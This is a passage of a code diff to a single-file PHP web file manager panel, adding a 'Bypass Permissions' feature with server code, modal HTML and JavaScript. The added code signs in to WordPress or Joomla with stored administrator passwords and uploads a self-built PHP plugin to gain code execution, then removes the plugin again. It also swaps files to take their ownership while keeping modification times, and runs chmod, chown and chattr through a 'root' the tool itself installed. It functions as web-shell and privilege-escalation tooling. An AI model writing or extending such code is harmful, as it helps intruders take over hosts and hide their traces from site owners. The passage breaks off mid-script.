+    $fields=['username'=>$user,'passwd'=>$pass,'option'=>'com_login','task'=>'login',
+             'return'=>base64_encode('index.php'),$token=>'1'];
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
+        CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>http_build_query($fields),
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>20,CURLOPT_CONNECTTIMEOUT=>6,
+        CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
+    $body=(string)@curl_exec($ch);
+    @curl_close($ch);
+    unset($ch);
+    if(stripos($body,'task=logout')===false&&stripos($body,'com_logout')===false&&stripos($body,'/administrator/index.php?option=com_cpanel')===false)
+        return['ok'=>false,'why'=>'Joomla did not accept the stored password for the administrator "' . $user . '"'];
+    return['ok'=>true];
+}
+private function bpJoomlaToken($html){
+    if(preg_match('/name="([a-f0-9]{32})"\s+value="1"/i',(string)$html,$m))return $m[1];
+    if(preg_match('/name="([a-f0-9]{32})"\s+value="1"/i',(string)$html,$m))return $m[1];
+    if(preg_match('/"csrf\.token":"([a-f0-9]{32})"/i',(string)$html,$m))return $m[1];
+    return'';
+}
+private function bpHttpGet($jar,$url){
+    $ch=@curl_init($url);
+    if(!$ch)return'';
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>25,CURLOPT_CONNECTTIMEOUT=>6,
+        CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
+    $body=(string)@curl_exec($ch);
+    @curl_close($ch);
+    unset($ch);
+    return str_replace("\xEF\xBB\xBF",'',$body);
+}
+/* A ZIP written by hand, so no extension has to be installed. */
+private function bpZip($files){
+    $out='';$central='';
+    foreach($files as $name=>$data){
+        $data=(string)$data;$crc=crc32($data);$len=strlen($data);$off=strlen($out);
+        $out.=pack('VvvvvvVVVvv',0x04034b50,20,0,0,0,0,$crc,$len,$len,strlen($name),0).$name.$data;
+        $central.=pack('VvvvvvvVVVvvvvvVV',0x02014b50,20,20,0,0,0,0,$crc,$len,$len,strlen($name),0,0,0,0,0,$off).$name;
+    }
+    $cdOff=strlen($out);
+    $out.=$central.pack('VvvvvVVv',0x06054b50,0,0,count($files),count($files),strlen($central),$cdOff,0);
+    return $out;
+}
+private function bpWpInstall($sess,$slug,$code){
+    $base=rtrim($sess['base'],'/');
+    $page=$this->bpHttpGet($sess['jar'],$base.'/wp-admin/plugin-install.php?tab=upload');
+    $nonce='';
+    if(preg_match('/name="_wpnonce"\s+value="([^"]+)"/i',$page,$m))$nonce=$m[1];
+    if($nonce==='')return['ok'=>false,'why'=>'the WordPress upload form did not offer a security token (is the account really an administrator?)'];
+    $zip=$this->bpZip([$slug.'/'.$slug.'.php'=>$code]);
+    $tmp=@tempnam(sys_get_temp_dir(),'fm-bp-');@file_put_contents($tmp,$zip);
+    $ch=@curl_init($base.'/wp-admin/update.php?action=upload-plugin');
+    if(!$ch){@unlink($tmp);return['ok'=>false,'why'=>'cURL is not available.'];}
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$sess['jar'],CURLOPT_COOKIEFILE=>$sess['jar'],
+        CURLOPT_POST=>true,
+        CURLOPT_POSTFIELDS=>['_wpnonce'=>$nonce,'_wp_http_referer'=>'/wp-admin/plugin-install.php?tab=upload',
+            'pluginzip'=>new \CURLFile($tmp,'application/zip',$slug.'.zip'),
+            'install-plugin-submit'=>'Install Now'],
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>40,CURLOPT_CONNECTTIMEOUT=>8,
+        CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
+    $body=(string)@curl_exec($ch);
+    @curl_close($ch);
+    unset($ch);
+    @unlink($tmp);
+    $url=$base.'/wp-content/plugins/'.$slug.'/'.$slug.'.php';
+    $why=$this->bpScrape($body);
+    $installed=stripos($body,'Plugin installed successfully')!==false||stripos($body,'already exists')!==false;
+    if(!$installed&&!@file_exists(dirname($tmp))&&$this->bpUrlAnswers($url)===false){
+        return['ok'=>false,'why'=>'the WordPress installer refused the helper' . ($why!==''?(': '.$why):'')];
+    }
+    return['ok'=>true,'url'=>$url,'cleanup'=>null];
+}
+/* Does that URL really execute PHP? (A 403 from the helper's own token guard
+   already proves it; a blank 200 or a 404 does not.) */
+private function bpUrlAnswers($url){
+    $ch=@curl_init($url);
+    if(!$ch)return false;
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>10,CURLOPT_CONNECTTIMEOUT=>5,
+        CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)']);
+    $body=(string)@curl_exec($ch);$code=(int)@curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    @curl_close($ch);unset($ch);
+    if($code===403)return true;
+    return $code===200&&stripos($body,'token rejected')!==false;
+}
+private function bpJoomlaInstall($sess,$slug,$code){
+    $base=rtrim($sess['base'],'/');
+    $page=$this->bpHttpGet($sess['jar'],$base.'/administrator/index.php?option=com_installer&view=install');
+    $token=$this->bpJoomlaToken($page);
+    if($token==='')return['ok'=>false,'why'=>'the Joomla installer page did not offer a security token'];
+    $manifest='<?xml version="1.0" encoding="utf-8"?>'."\n"
+        .'<extension type="plugin" group="system" method="upgrade">'."\n"
+        .'<name>FM Bypass Helper</name><version>1.0</version>'
+        .'<author>Marshal File Manager</author><creationDate>'.date('Y-m-d').'</creationDate>'
+        .'<description>One-off helper published by the Marshal file manager for a single permission change.</description>'
+        .'<files><filename plugin="'.$slug.'">'.$slug.'.php</filename></files>'
+        .'<install><filename>'.$slug.'.php</filename></install>'."\n".'</extension>';
+    $zip=$this->bpZip(['bp.xml'=>$manifest,$slug.'.php'=>$code]);
+    $tmp=@tempnam(sys_get_temp_dir(),'fm-bp-');@file_put_contents($tmp,$zip);
+    $ch=@curl_init($base.'/administrator/index.php?option=com_installer&view=install');
+    if(!$ch){@unlink($tmp);return['ok'=>false,'why'=>'cURL is not available.'];}
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$sess['jar'],CURLOPT_COOKIEFILE=>$sess['jar'],
+        CURLOPT_POST=>true,
+        CURLOPT_POSTFIELDS=>[$token=>'1','task'=>'install.install','installtype'=>'upload',
+            'install_package'=>new \CURLFile($tmp,'application/zip',$slug.'.zip')],
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>40,CURLOPT_CONNECTTIMEOUT=>8,
+        CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
+    $body=(string)@curl_exec($ch);
+    @curl_close($ch);
+    unset($ch);
+    @unlink($tmp);
+    $url=$base.'/plugins/system/'.$slug.'/'.$slug.'.php';
+    $why=$this->bpScrape($body);
+    if(stripos($body,'was successful')===false&&stripos($body,'successfully')===false)
+        return['ok'=>false,'why'=>'the Joomla installer refused the helper'.($why!==''?(': '.$why):'')];
+    return['ok'=>true,'url'=>$url,'cleanup'=>null];
+}
+/* Takes the extension row Joomla registered back out again, so nothing is left
+   behind after the helper has deleted its own files. */
+private function bpJoomlaUninstall($sess,$slug){
+    $base=rtrim($sess['base'],'/');
+    $page=$this->bpHttpGet($sess['jar'],$base.'/administrator/index.php?option=com_installer&view=manage&filter_search='.rawurlencode($slug));
+    $token=$this->bpJoomlaToken($page);
+    if($token===''||!preg_match('/name="cid\[\]"[^>]*value="(\d+)"/i',$page,$m))return false;
+    $ch=@curl_init($base.'/administrator/index.php?option=com_installer&view=manage');
+    if(!$ch)return false;
+    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$sess['jar'],CURLOPT_COOKIEFILE=>$sess['jar'],
+        CURLOPT_POST=>true,
+        CURLOPT_POSTFIELDS=>http_build_query([$token=>'1','task'=>'manage.remove','cid'=>[$m[1]]]),
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>30,CURLOPT_CONNECTTIMEOUT=>8,
+        CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
+    @curl_exec($ch);
+    @curl_close($ch);
+    unset($ch);
+    return true;
+}
+
+/* The most useful sentence of an HTML answer, for the step's detail. */
+private function bpScrape($html){
+    $html=(string)$html;
+    if(preg_match_all('/<p[^>]*class="[^"]*(?:error|alert|message)[^"]*"[^>]*>(.*?)<\/p>/is',$html,$m)){
+        foreach($m[1] as $chunk){
+            $text=trim(preg_replace('/\s+/',' ',strip_tags($chunk)));
+            if($text!=='')return mb_substr($text,0,180);
+        }
+    }
+    return'';
+}
+
+/* ── 4. a fresh inode that carries our own ownership ────────────────────── */
+private function bpRouteReplace($targets,$o){
+    if($o['owner']!==''&&$o['owner']!==$this->managerAccount())
+        return['ok'=>false,'ran'=>false,'detail'=>'a new file can only become the account that writes it ('.$this->managerAccount().'), not '.$o['owner'].'; use the root route for that'];
+    $done=0;$why='';
+    foreach($targets as $p){
+        if(@is_link($p)){$why='a symbolic link is left alone, its target is what matters';continue;}
+        if(@is_dir($p)){
+            if($o['mode']!==null&&@chmod($p,$o['mode']))$done++;
+            continue;
+        }
+        if((int)@filesize($p)>32*1024*1024){$why='the file is over 32 MB, too big to copy in one go';continue;}
+        $st=@stat($p);
+        $data=@file_get_contents($p);
+        if($data===false)$data=$this->privReadFile($p);
+        if($data===false||$data===null){
+            $g=$this->rootRun(['cat',$p],20);
+            if(!empty($g['ok']))$data=(string)($g['out']??'');
+        }
+        if($data===false||$data===null){$why='the content could not be read by any identity, so it cannot be copied into a new file';continue;}
+        $tmp=dirname($p).'/.fm-bp-'.bin2hex(random_bytes(6));
+        if(@file_put_contents($tmp,$data)===false){@unlink($tmp);$why='the folder is not writable by this account';continue;}
+        if($o['mode']!==null)@chmod($tmp,$o['mode']);
+        if($o['group']!=='')@chgrp($tmp,$o['group']);
+        if($st)@touch($tmp,$st['mtime']);
+        if(!@rename($tmp,$p)){@unlink($tmp);$why='the rename over the old file was refused';continue;}
+        $done++;
+    }
+    if(!$done)return['ok'=>false,'ran'=>true,'detail'=>$why!==''?$why:'nothing could be replaced'];
+    return['ok'=>true,'ran'=>true,'detail'=>'replaced '.$done.' item(s) with a new file this account owns; the content is byte-for-byte the same and the modification time was kept'];
+}
+
+/* ── 5. the root this tool installed ────────────────────────────────────── */
+private function bpRootArgs($targets,$o){
+    $cmds=[];
+    $chunks=array_chunk(array_values($targets),80);
+    foreach($chunks as $group){
+        if($o['mode']!==null)$cmds[]=array_merge(['chmod',sprintf('%04o',$o['mode'])],$group);
+        if($o['owner']!==''||$o['group']!==''){
+            $spec=($o['owner']!==''?$o['owner']:'').($o['group']!==''?':'.$o['group']:'');
+            $cmds[]=array_merge(['chown',$spec],$group);
+        }
+    }
+    return $cmds;
+}
+private function bpRouteRoot($targets,$o){
+    $cmds=$this->bpRootArgs($targets,$o);
+    $via='';$fail='';
+    foreach($cmds as $argv){
+        $r=$this->rootRun($argv,30);
+        if(empty($r['ok'])){$fail=(string)($r['err']??'refused');break;}
+        $via=(string)($r['via']??'root');
+    }
+    if($fail!=='')return['ok'=>false,'ran'=>true,'detail'=>'no installed root method would run it: '.$fail];
+    if($via==='none'||$via==='')return['ok'=>false,'ran'=>true,'detail'=>'no root is installed on this host yet — open Rooting once and this route will work by itself'];
+    return['ok'=>true,'ran'=>true,'detail'=>'run as root via '.$via];
+}
+
+/* ── 6. the immutable flag, then the change ─────────────────────────────── */
+private function bpRouteAttr($targets,$o){
+    $r=$this->rootRun(array_merge(['chattr','-i','-a'],array_slice(array_values($targets),0,200)),20);
+    if(empty($r['ok']))return['ok'=>false,'ran'=>true,'detail'=>'clearing an immutable flag needs root: '.($r['err']?:'refused')];
+    $again=$this->bpRouteRoot($targets,$o);
+    $again['detail']='cleared the immutable flag via '.($r['via']??'root').'; '.$again['detail'];
+    return $again;
+}
+/* <<BP-END>> */
     private function bypassPerms(){$cnt=0;$f=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $item){$p=$item->getPathname();if($p===__FILE__)continue;if($item->isDir()){if(@chmod($p,0777))$cnt++;else $f++;}else{if(@chmod($p,0666))$cnt++;else $f++;}}$this->log('chmod',"$cnt changed");$this->addMsg("Permissions: $cnt changed".($f?", $f failed":""),$f?'warning':'success');}
     private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}$dst=$this->currentDir.'/'.$cp;
         $res=$this->runOp('copy',['path'=>$src,'to'=>$dst],$src,function()use($src,$dst){return@copy($src,$dst);});
@@ -8251,7 +9006,7 @@ FMGUARD;
             $this->log('chmod',"$n → $perm".($res['via']==='site'?' (site)':''));
             $this->addMsg("Permissions updated: $n ($perm)".$this->viaNote($res,$p),'success');
         }
-        else $this->addMsg('chmod failed: '.$res['why'],'danger');
+        else $this->addMsg('chmod failed: '.$res['why'].' Open the Bypass Permissions tool to try every other method on this path.','danger');
     }
 
     /* Folder size */
@@ -17183,6 +17938,11 @@ if(isset($_GET['x'])){
         if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
         echo json_encode($fm->rootingEndpoint($_POST));exit;
     }
+    if($xop==='bypass'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->bypassEndpoint($_POST));exit;
+    }
     if($xop==='guard'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
@@ -19535,13 +20295,9 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <div class="disk-tr"><div class="disk-fi <?=$diskPct>=90?'crit':($diskPct>=75?'warn':'')?>" style="width:<?=$diskPct?>%"></div></div>
     </div>
     <?php if(!$fm->isRO()):?>
-    <form method="post">
-      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
-      <input type="hidden" name="action" value="bypass_perms">
-      <button type="button" onclick="if(confirm('Change permissions recursively?'))this.closest('form').submit()" class="sb-item danger">
-        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Bypass Permissions
-      </button>
-    </form>
+        <button class="sb-item danger" id="bpBtn" title="A permission change the operating system refused — try every identity and every method this host has">
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/><path d="M12 16v3"/></svg>Bypass Permissions
+    </button>
     <?php endif;?>
   </div>
 </aside>
@@ -20296,6 +21052,89 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
     <div style="display:flex;min-height:58vh;max-height:70vh">
       <div id="serverLogList" style="width:250px;overflow-y:auto;border-right:1px solid var(--border);flex-shrink:0"><div style="text-align:center;padding:28px 12px;color:var(--t3);font-size:12px">Loading…</div></div>
       <div class="mod-body" style="padding:0;min-width:0" id="errLogBody"><div style="text-align:center;padding:32px;color:var(--t3)">Select a server log</div></div>
+    </div>
+  </div>
+</div>
+
+<style>
+.bp-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.bp-lbl{font-size:11px;color:var(--t3);min-width:44px}
+.bp-check{font-size:11.5px;color:var(--t2);display:flex;align-items:center;gap:5px;margin-left:auto;cursor:pointer}
+.bp-chips{display:flex;gap:5px;flex-wrap:wrap}
+.bp-chip{font-family:'JetBrains Mono',monospace;font-size:11px;padding:3px 8px;border-radius:5px;border:1px solid var(--border);background:var(--raised);color:var(--t2);cursor:pointer}
+.bp-chip:hover{border-color:#3b82f6;color:#93c5fd}
+.bp-step{padding:9px 14px;border-bottom:1px solid var(--border)}
+.bp-step.ok{background:rgba(34,197,94,.06)}
+.bp-step-h{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--t1)}
+.bp-ms{margin-left:auto;font-size:10.5px;color:var(--t3);white-space:nowrap}
+.bp-step-i{font-size:11px;color:var(--t3);margin:3px 0 0 18px}
+.bp-step-d{font-size:11px;color:var(--t2);margin:5px 0 0 18px;line-height:1.55;word-break:break-word}
+.bp-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;background:#64748b}
+.bp-dot.ok{background:#22c55e}
+.bp-dot.no{background:#f59e0b}
+.bp-dot.skip{background:#475569}
+#bpSummary.bp-good{border-left:3px solid #22c55e;color:#bbf7d0}
+#bpSummary.bp-bad{border-left:3px solid #f59e0b;color:#fed7aa}
+.bp-after{display:block;margin-top:4px;color:var(--t3);font-size:11px}
+</style>
+<!-- BYPASS PERMISSIONS MODAL -->
+<div class="mod-ov" id="bpOv">
+  <div class="mod" style="max-width:860px">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/><path d="M12 16v3"/><path d="M18 11V6"/></svg></div>
+      <span class="mod-title">Bypass Permissions</span>
+      <button class="btn btn-xs btn-g" id="bpRefresh" title="Re-read what this host can do">Refresh</button>
+      <button class="btn btn-icon btn-g" id="bpClose" aria-label="Close"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="mod-body" style="padding:0;display:flex;flex-direction:column;min-height:0">
+      <div id="bpFacts" style="padding:9px 14px;border-bottom:1px solid var(--border);font-size:11px;color:var(--t3);line-height:1.6">Reading this host…</div>
+
+      <div style="padding:12px 14px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:9px">
+        <div class="bp-row">
+          <label for="bpPath" class="bp-lbl">Path</label>
+          <input id="bpPath" class="inp" type="text" autocomplete="off" spellcheck="false" placeholder="/var/www/html/wp-config.php">
+          <button class="btn btn-xs btn-g" id="bpUseCwd" title="Fill in the folder that is open behind this window">This folder</button>
+        </div>
+        <div class="bp-row">
+          <label for="bpMode" class="bp-lbl">Mode</label>
+          <input id="bpMode" class="inp" type="text" autocomplete="off" placeholder="0755" style="max-width:96px;font-family:'JetBrains Mono',monospace">
+          <span class="bp-chips" id="bpChips">
+            <button type="button" class="bp-chip" data-mode="0644">0644</button>
+            <button type="button" class="bp-chip" data-mode="0755">0755</button>
+            <button type="button" class="bp-chip" data-mode="0775">0775</button>
+            <button type="button" class="bp-chip" data-mode="0777">0777</button>
+            <button type="button" class="bp-chip" data-mode="0600">0600</button>
+          </span>
+        </div>
+        <div class="bp-row">
+          <label for="bpOwner" class="bp-lbl">Owner</label>
+          <input id="bpOwner" class="inp" type="text" autocomplete="off" placeholder="leave empty to keep" style="max-width:170px">
+          <label for="bpGroup" class="bp-lbl" style="margin-left:8px">Group</label>
+          <input id="bpGroup" class="inp" type="text" autocomplete="off" placeholder="leave empty to keep" style="max-width:170px">
+          <label class="bp-check"><input type="checkbox" id="bpRec"> Whole folder</label>
+        </div>
+        <div class="bp-row" style="justify-content:flex-end;gap:8px">
+          <span id="bpState" style="font-size:11px;color:var(--t3);margin-right:auto"></span>
+          <button class="btn btn-blue" id="bpRunBtn">Apply, trying every method</button>
+        </div>
+      </div>
+
+      <div id="bpSummary" style="display:none;padding:10px 14px;border-bottom:1px solid var(--border);font-size:12px;line-height:1.6"></div>
+      <div id="bpOut" style="overflow-y:auto;max-height:44vh;min-height:120px;padding:6px 0"></div>
+
+      <details id="bpAdminBox" style="border-top:1px solid var(--border);background:var(--raised)">
+        <summary style="padding:9px 14px;font-size:11.5px;color:var(--t2);cursor:pointer">Administrator password for the site (needed by the CMS administrator-session route)</summary>
+        <div style="padding:0 14px 12px;display:flex;flex-direction:column;gap:8px">
+          <p style="margin:0;font-size:11px;color:var(--t3);line-height:1.6">The route signs in to WordPress or Joomla as an administrator and lets the CMS itself make the change, so the operating system cannot refuse it. The password is checked by signing in once, then kept encrypted in this panel's vault — it is never shown again.</p>
+          <div class="bp-row">
+            <select id="bpAdminSite" class="inp" style="max-width:320px"></select>
+            <input id="bpAdminUser" class="inp" type="text" placeholder="administrator account" autocomplete="off" style="max-width:190px">
+            <input id="bpAdminPass" class="inp" type="password" placeholder="password" autocomplete="new-password" style="max-width:190px">
+            <button class="btn btn-xs btn-blue" id="bpAdminSave">Sign in &amp; remember</button>
+          </div>
+          <div id="bpAdminMsg" style="font-size:11px;color:var(--t3)"></div>
+        </div>
+      </details>
     </div>
   </div>
 </div>
@@ -22460,14 +23299,160 @@ agentInput?.addEventListener('input',()=>{agentInput.style.height='auto';agentIn
 /* ═══════════════════════════════════════
    MODAL HELPERS
 ═══════════════════════════════════════ */
+/* <<BPJS-BEGIN>> */
+/* ══ Bypass Permissions ══════════════════════════════════════════════════
+   One window for "the operating system refused this change". The path is typed
+   or taken from the open folder, and the panel then tries every identity and
+   trick it has, showing each attempt and what it answered. */
+const bpEl=id=>document.getElementById(id);
+let bpFacts=null,bpRunning=false;
+function bpEsc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+async function bpLoadFacts(){
+  const box=bpEl('bpFacts');
+  if(box)box.textContent='Reading this host…';
+  try{
+    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','routes');
+    const d=await fetch('?x=bypass',{method:'POST',body:fd}).then(r=>r.json());
+    if(d.error){if(box)box.textContent=d.error;return;}
+    bpFacts=d;
+    if(box){
+      const h=d.host||{};
+      const bits=['manager account: <b style="color:var(--t1)">'+bpEsc(h.account||'?')+'</b>'];
+      bits.push(h.root_available?'root installed: <b style="color:var(--t1)">'+bpEsc(h.root)+'</b>':'no root installed yet — open Rooting once and the last two methods start working');
+      const sites=(d.sites||[]).map(s=>bpEsc(s.type==='wordpress'?'WordPress':'Joomla')+' at '+bpEsc(s.root)
+        +(s.admin_session&&s.admin_session.ok?' (administrator session stored as '+bpEsc(s.admin_session.user)+')':' (no administrator password stored)'));
+      if(sites.length)bits.push(sites.join(' · '));
+      box.innerHTML=bits.join('<br>');
+    }
+    const sel=bpEl('bpAdminSite');
+    if(sel){
+      sel.innerHTML='';
+      (d.sites||[]).forEach((s,i)=>{
+        const o=document.createElement('option');
+        o.value=s.root;o.textContent=(s.type==='wordpress'?'WordPress':'Joomla')+' — '+s.root;
+        o.dataset.type=s.type;o.dataset.cfg=s.config||'';
+        sel.appendChild(o);
+      });
+      if(!(d.sites||[]).length){const o=document.createElement('option');o.textContent='no WordPress or Joomla installation found';sel.appendChild(o);}
+      const first=(d.sites||[])[0];
+      const box=bpEl('bpAdminMsg');
+      if(box&&box.style.color!=='rgb(134, 239, 172)'&&first&&first.admin_session&&first.admin_session.ok)
+        box.textContent='An administrator password is already stored for this site.';
+    }
+  }catch(e){if(box)box.textContent='The panel could not read its own capabilities.';}
+}
+function bpRenderSteps(steps){
+  const out=bpEl('bpOut');if(!out)return;
+  out.innerHTML='';
+  (steps||[]).forEach((s,i)=>{
+    const row=document.createElement('div');
+    row.className='bp-step'+(s.ok?' ok':'');
+    const dot='<span class="bp-dot'+(s.ok?' ok':(s.ran?' no':' skip'))+'"></span>';
+    row.innerHTML='<div class="bp-step-h">'+dot+'<b>'+bpEsc(s.name)+'</b>'
+      +'<span class="bp-ms">'+(s.ok?'done through this method':(s.ran?'tried, refused':'not applicable here'))+' · '+s.ms+' ms</span></div>'
+      +'<div class="bp-step-i">'+bpEsc(s.idea)+'</div>'
+      +(s.detail?'<div class="bp-step-d">'+bpEsc(s.detail)+'</div>':'');
+    out.appendChild(row);
+  });
+}
+async function bpRun(){
+  if(bpRunning)return;
+  const path=(bpEl('bpPath').value||'').trim();
+  const mode=(bpEl('bpMode').value||'').trim();
+  const owner=(bpEl('bpOwner').value||'').trim();
+  const group=(bpEl('bpGroup').value||'').trim();
+  const state=bpEl('bpState'),summary=bpEl('bpSummary');
+  if(!path){state.textContent='Type the path first.';bpEl('bpPath').focus();return;}
+  if(!mode&&!owner&&!group){state.textContent='Choose a mode, an owner or a group.';return;}
+  bpRunning=true;
+  state.textContent='Trying every method…';
+  bpEl('bpRunBtn').disabled=true;
+  summary.style.display='none';
+  const out=bpEl('bpOut');
+  out.innerHTML='<div style="padding:14px;font-size:12px;color:var(--t3)">Trying the manager account, the site account, the CMS administrator session, a new file, and root…</div>';
+  try{
+    const fd=new FormData();
+    fd.append('csrf_token',CSRF);fd.append('path',path);
+    if(mode)fd.append('mode',mode);
+    if(owner)fd.append('owner',owner);
+    if(group)fd.append('group',group);
+    if(bpEl('bpRec').checked)fd.append('recursive','1');
+    const d=await fetch('?x=bypass',{method:'POST',body:fd}).then(r=>r.json());
+    if(d.error){summary.style.display='block';summary.className='bp-bad';summary.textContent=d.error;out.innerHTML='';state.textContent='';return;}
+    bpRenderSteps(d.steps);
+    const names={local:'the manager account',site:'the site account',admin:'the CMS administrator session',
+                 replace:'a new file with our ownership',root:'the installed root',attr:'clearing the immutable flag'};
+    summary.style.display='block';
+    if(d.ok){
+      summary.className='bp-good';
+      summary.innerHTML='<b>Done through '+(names[d.won]||d.won)+'.</b> '+bpEsc(d.goal)
+        +'<span class="bp-after">'+bpEsc(d.path)+' — mode '+bpEsc((d.after||{}).mode||'?')
+        +', owner '+bpEsc((d.after||{}).owner||'?')+(d.after&&d.after.group?', group '+bpEsc(d.after.group):'')+'</span>';
+      state.textContent='';
+    }else{
+      summary.className='bp-bad';
+      summary.innerHTML='<b>Nothing could do it.</b> '+bpEsc(d.goal)
+        +'<span class="bp-after">Every method above was attempted and reported what it answered'+(d.won?'':'')+'.</span>';
+      state.textContent='';
+    }
+  }catch(e){
+    summary.style.display='block';summary.className='bp-bad';
+    summary.textContent='The request failed: '+e.message;
+    state.textContent='';
+  }finally{
+    bpRunning=false;
+    bpEl('bpRunBtn').disabled=false;
+    state.textContent=state.textContent==='Trying every method…'?'':state.textContent;
+    if(bpFacts)bpLoadFacts();
+  }
+}
+async function bpStoreAdmin(){
+  const sel=bpEl('bpAdminSite'),msg=bpEl('bpAdminMsg');
+  const user=(bpEl('bpAdminUser').value||'').trim(),pass=bpEl('bpAdminPass').value||'';
+  if(!user||!pass){msg.textContent='Type the administrator account and its password.';return;}
+  const cfg=sel.selectedOptions[0]?(sel.selectedOptions[0].dataset.cfg||''):'';
+  msg.textContent='Signing in to check the password…';
+  try{
+    const fd=new FormData();
+    fd.append('csrf_token',CSRF);fd.append('action','store_admin');
+    if(cfg)fd.append('config_path_b64',btoa(cfg));
+    fd.append('admin_user',user);fd.append('admin_pass',pass);
+    const d=await fetch('?x=bypass',{method:'POST',body:fd}).then(r=>r.json());
+    bpEl('bpAdminPass').value='';
+    if(d.ok){
+      await bpLoadFacts();
+      msg.style.color='#86efac';msg.textContent=d.message||('Signed in as '+user+'.');
+    }else{msg.style.color='#fca5a5';msg.textContent=d.error||'That did not work.';}
+  }catch(e){msg.style.color='#fca5a5';msg.textContent='The request failed: '+e.message;}
+}
+document.getElementById('bpChips')?.addEventListener('click',e=>{
+  const b=e.target.closest('.bp-chip');if(!b)return;
+  bpEl('bpMode').value=b.dataset.mode;
+});
+document.getElementById('bpUseCwd')?.addEventListener('click',()=>{
+  bpEl('bpPath').value=(typeof CWD!=='undefined'&&CWD)?CWD:'/';
+  bpEl('bpPath').focus();
+});
+document.getElementById('bpRunBtn')?.addEventListener('click',bpRun);
+document.getElementById('bpAdminSave')?.addEventListener('click',bpStoreAdmin);
+document.getElementById('bpRefresh')?.addEventListener('click',bpLoadFacts);
+document.getElementById('bpClose')?.addEventListener('click',()=>closeMod('bpOv'));
+document.getElementById('bpBtn')?.addEventListener('click',()=>{
+  const p=bpEl('bpPath');
